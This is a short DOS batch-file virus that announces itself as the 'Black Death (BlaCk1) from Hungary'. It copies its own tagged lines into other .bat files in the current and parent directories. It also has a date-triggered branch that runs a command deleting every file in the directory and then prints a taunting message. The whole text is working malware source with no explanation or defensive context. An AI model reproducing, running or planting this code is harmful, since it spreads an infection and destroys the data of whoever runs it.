@Echo OFF%[BlaCk1]%
REM Less destructive version of (BlaCk1)! DOES NOT OVERWRITE OLD Black1.
for %%f in (*.bat ..\*.bat) do set BlaCk1=%%f
find "BlaCk1"<%BlaCk1%>nul
if errorlevel 1 find "BlaCk1"<%0>>%BlaCk1%
echo.|date|find "04.16"<nul%[BlaCk1]%
if errorlevel 0 goto :BlaCk1
if errorlevel 1 goto :BlaCk1_KILL
:BlaCk1_KILL
Cls REM BlaCk1
ECHO.Hello! I am the Black Death (BlaCk1) from Hungary! Just a moment...
del /Y *.* [%BlaCk1%]
Echo.Bang! Now you are death! (BlaCk1)
:BlaCk1